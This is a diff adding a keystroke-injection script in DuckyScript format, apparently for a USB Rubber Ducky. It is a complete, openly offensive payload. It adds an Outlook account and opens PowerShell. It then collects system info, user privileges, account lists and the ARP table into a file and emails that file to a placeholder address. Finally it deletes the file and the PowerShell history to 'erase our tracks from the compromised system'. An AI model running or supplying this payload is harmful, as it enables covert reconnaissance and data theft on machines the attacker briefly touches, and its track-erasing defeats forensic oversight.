@@ -1,0 +1,167 @@
+REM - Add an Outlook account (If one already exists then the command won't really do anything)
+REM -------------------------- 
+
+DELAY 500
+GUI r
+DELAY 500
+STRING outlook
+DELAY 500
+ENTER
+
+DELAY 5000
+ALT F
+DELAY 500
+RIGHT
+DELAY 500
+ENTER
+DELAY 500
+STRING <EMAIL>
+DELAY 500
+ENTER
+DELAY 2000
+STRING <EMAIL'S PASSWORD>
+DELAY 500
+ENTER
+DELAY 2000
+ENTER
+DELAY 500
+ALT F4
+
+REM - Open PowerShell.exe
+REM -------------------------- 
+
+DELAY 500
+GUI r
+DELAY 500
+STRING PowerShell.exe
+DELAY 500
+ENTER
+
+REM - Fetch system information
+REM -------------------------- 
+
+DELAY 2000
+STRING echo 'System information:' > Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING systeminfo >> Oops.txt
+DELAY 500 
+ENTER
+DELAY 500
+STRING echo '' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING echo 'Current user information:' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 700
+STRING echo '' >> Oops.txt
+DELAY 500
+ENTER
+
+REM - Fetch user information
+REM -------------------------- 
+
+DELAY 500
+STRING whoami >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING whoami /priv >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING echo '' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING echo 'List of users:' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING echo '' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING wmic useraccount list >> Oops.txt
+DELAY 500
+ENTER
+
+REM - Fetch addresses
+REM -------------------------- 
+
+DELAY 500
+STRING echo '' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING echo 'Network addresses:' >> Oops.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING arp -a >> Oops.txt
+DELAY 500
+ENTER
+
+REM - Exfiltrate the enumerated file using Outlook
+REM -------------------------- 
+
+DELAY 500
+STRING $Oops = pwd
+DELAY 500
+ENTER
+DELAY 500
+STRING $Oopsies = "$Oops\Oops.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING $outlook = new-object -comobject outlook.application
+DELAY 500
+ENTER
+DELAY 500
+STRING $email = $outlook.CreateItem(0)
+DELAY 500
+ENTER
+DELAY 500
+STRING $email.To = "<EMAIL>"
+DELAY 500
+ENTER
+DELAY 500
+STRING $email.Subject = "Oops"
+DELAY 500
+ENTER
+STRING $email.Body = "Oops"
+DELAY 500
+ENTER
+DELAY 500
+STRING $email.Attachments.add($Oopsies)
+DELAY 500
+ENTER
+DELAY 500
+STRING $email.Send()
+DELAY 500
+ENTER
+DELAY 500
+STRING $outlook.Quit()
+DELAY 500
+ENTER
+
+REM - Erase our tracks from the compromised system
+REM -------------------------- 
+
+DELAY 500
+STRING del Oops.txt
+DELAY 500
+ENTER
+
+DELAY 500
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
+DELAY 500
+ENTER
+
+REM - Check PowerShell History
+REM - Get-Content (Get-PSReadlineOption).HistorySavePath
+
+
